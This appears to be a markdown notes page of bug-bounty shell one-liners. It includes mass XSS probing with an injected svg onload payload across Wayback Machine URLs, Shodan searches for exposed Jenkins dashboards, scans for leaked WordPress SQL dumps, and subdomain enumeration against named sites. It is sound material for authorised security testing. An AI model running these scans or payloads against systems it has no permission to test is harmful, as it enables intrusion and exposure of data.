---
title: OneLiners
icon: fas fa-info-circle
order: 3
---

### Mass XSS via wayback machine<br>
+ ``gau http://target.com | uro | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'``<br>
+ ``gau google.com | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'``


### Mass IPs listing Via Shodan<br>
+ ```shodan search --limit 1000 'http.title:"Dashboard [Jenkins]"' | awk  '{print $1,":"$2}' | sed 's/ //' | httpx -silent | tee /root/Desktop/shodan.txt```


### Subdomain from crt.sh<br>
+ ```curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | tee /root/Desktop/crt.txt```

### wordpress mysql <br>
+ ```sublist3r -d target.com | httpx -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -ports 80,443,8080,8443```

### Get all urls from sitemap
+ ``curl -s https://target.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'``

### Waybackurls Validators
+ ``waybackurls http://bugcrowd.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} > %{url_effective}\n" | sort``

### Extract all endpoints from js file
+ ``cat files.txt | grep -aoP "(?<=(\"|\'|`))\/[a-zA-Z0-9?&=\/-#.](?=(\"|\'|`))" | sort -u | tee output.txt``

### OneLiner  http://rapiddns.io Curl for Doamin Recon :
+ ``curl -s "https://rapiddns.io/subdomain/paypal.com?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | cut -d '/' -f3  | sed 's/?t=cname//g' | sed 's/#result//g' | sed 's/\.$//' | sort -u``

### Check Mass CNAME records
``cat live-domains.txt | while read domains;do dig $domains;done | grep CNAME``



